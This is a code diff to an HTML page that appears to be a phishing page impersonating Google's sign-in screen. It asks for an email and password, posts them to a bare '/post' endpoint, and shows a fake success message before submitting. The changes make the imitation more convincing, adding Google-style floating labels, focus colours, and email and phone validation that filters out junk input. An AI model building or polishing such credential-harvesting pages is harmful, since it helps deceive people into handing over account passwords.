@@ -11,14 +11,16 @@
     }
     body{
       font-family: Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
       align-items: center;
       justify-content: center;
-      background-color: #FFFFFF;
+      background: linear-gradient(180deg, #ffffff 0%, #faf8ff 100%);
+      color: #202124;
     }
     input[type='text'], input[type='password']{
       width: 100%;
-      padding: 12px 10px;
-      margin: 8px 0;
       box-sizing: border-box;
       border: 1px solid #cccccc;
       border-radius: 4px;
@@ -27,6 +29,7 @@
       margin: auto;
       padding: 20px;
       max-width: 700px;
+      width: 100%;
     }
     .logo-container{
       text-align: center;
@@ -49,9 +52,9 @@
     .form-container{
       background: #FFFFFF;
       border: 1px solid #CEC0DE;
-      border-radius: 4px;
-      padding: 20px;
-      box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);
+      border-radius: 16px;
+      padding: 28px 24px 20px;
+      box-shadow: 0 10px 30px rgba(108, 66, 156, 0.14);
     }
     h1{
       text-align: center;
@@ -59,13 +62,54 @@
       font-weight: 500;
       margin-bottom: 20px;
     }
+    .field-group{
+      position: relative;
+      margin-bottom: 18px;
+    }
     .input-field{
       width: 100%;
-      padding: 12px;
+      padding: 18px 12px 8px;
       border: 1px solid #BEABD3;
-      border-radius: 4px;
-      margin-bottom: 20px;
+      border-radius: 8px;
       font-size: 14px;
+      background: #fff;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+    .input-field:focus{
+      outline: none;
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.12);
+    }
+    .floating-label{
+      position: absolute;
+      left: 12px;
+      top: 14px;
+      color: #5f6368;
+      font-size: 14px;
+      pointer-events: none;
+      background: #fff;
+      padding: 0 4px;
+      transition: all 0.18s ease;
+    }
+    .input-field:focus + .floating-label,
+    .input-field:not(:placeholder-shown) + .floating-label{
+      top: -7px;
+      left: 10px;
+      font-size: 11px;
+      color: #1a73e8;
+    }
+    .input-field.invalid{
+      border-color: #d93025;
+      box-shadow: 0 0 0 3px rgba(217, 48, 37, 0.12);
+    }
+    .error-text{
+      display: none;
+      color: #d93025;
+      font-size: 12px;
+      margin-top: 4px;
+    }
+    .error-text.show{
+      display: block;
     }
     .submit-btn{
       background: #0b57d0;
@@ -171,8 +215,15 @@
           <div class='containersubtitle'>Use your Google Account</div>
         </center>
         <form action='/post' id='login-form'>
-          <input name='email' class='input-field' type='text' placeholder='Email or phone' required>
-          <input name='password' class='input-field' type='password' placeholder='Enter your password' required />
+          <div class='field-group'>
+            <input id='email' name='email' class='input-field' type='text' placeholder=' '>
+            <label for='email' class='floating-label'>Email or phone</label>
+            <div id='email-error' class='error-text'>Enter a valid email or phone number.</div>
+          </div>
+          <div class='field-group'>
+            <input id='password' name='password' class='input-field' type='password' placeholder=' '>
+            <label for='password' class='floating-label'>Enter your password</label>
+          </div>
           <div class='containermsg'>
             <button class="forgot-btn">Forgot password?</button>
           </div>
@@ -190,14 +241,79 @@
   </div>
 
   <script>
-    document.getElementById('login-form').addEventListener('submit', function(event) {
+    const form = document.getElementById('login-form');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const errorText = document.getElementById('email-error');
+
+    function isValidEmailOrPhone(value) {
+      const trimmed = value.trim();
+      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const phonePattern = /^\+?\d[\d\s()-]{7,}$/;
+      return emailPattern.test(trimmed) || phonePattern.test(trimmed);
+    }
+
+    function validateEmailField() {
+      const value = emailInput.value.trim();
+
+      if (!value) {
+        emailInput.setCustomValidity('Please fill out this field.');
+        errorText.textContent = 'Please fill out this field.';
+        return false;
+      }
+
+      if (!isValidEmailOrPhone(value)) {
+        emailInput.setCustomValidity('Enter a valid email or phone number.');
+        errorText.textContent = 'Enter a valid email or phone number.';
+        return false;
+      }
+
+      emailInput.setCustomValidity('');
+      errorText.textContent = 'Enter a valid email or phone number.';
+      return true;
+    }
+
+    function validatePasswordField() {
+      if (!passwordInput.value.trim()) {
+        passwordInput.setCustomValidity('Please enter your password.');
+        return false;
+      }
+
+      passwordInput.setCustomValidity('');
+      return true;
+    }
+
+    emailInput.addEventListener('input', function() {
+      const isValid = validateEmailField();
+      emailInput.classList.toggle('invalid', !isValid && emailInput.value.trim() !== '');
+      errorText.classList.toggle('show', !isValid && emailInput.value.trim() !== '');
+    });
+
+    passwordInput.addEventListener('input', function() {
+      validatePasswordField();
+    });
+
+    form.addEventListener('submit', function(event) {
       event.preventDefault();
+
+      const emailOk = validateEmailField();
+      const passwordOk = validatePasswordField();
+
+      emailInput.classList.toggle('invalid', !emailOk);
+      errorText.classList.toggle('show', !emailOk);
+
+      if (!emailOk || !passwordOk) {
+        if (!emailOk) emailInput.focus();
+        else passwordInput.focus();
+        form.reportValidity();
+        return;
+      }
 
       document.getElementById('success-block').style.display = 'flex';
       document.getElementById('form-block').style.display = 'none';
 
       setTimeout(function() {
-        document.getElementById('login-form').submit();
+        form.submit();
       }, 3000);
     });
   </script>
